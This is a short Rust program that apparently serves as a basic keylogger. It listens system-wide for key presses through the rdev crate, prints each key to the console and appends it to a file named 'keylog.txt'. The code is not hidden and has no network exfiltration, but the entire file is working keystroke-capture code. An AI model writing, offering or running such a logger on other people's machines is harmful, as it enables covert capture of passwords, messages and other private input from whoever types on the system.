use rdev::{listen, Event, EventType, Key};
use std::fs::OpenOptions;
use std::io::Write;

fn callback(event: Event) {
    if let EventType::KeyPress(key) = event.event_type {
        let key_str = format!("{:?}", key);
        println!("{}", key_str);

        // Log to file
        if let Ok(mut file) = OpenOptions::new()
            .create(true)
            .append(true)
            .open("keylog.txt")
        {
            let _ = writeln!(file, "{}", key_str);
        }
    }
}

fn main() {
    println!("Listening for key presses...");
    if let Err(error) = listen(callback) {
        eprintln!("Error: {:?}", error);
    }
}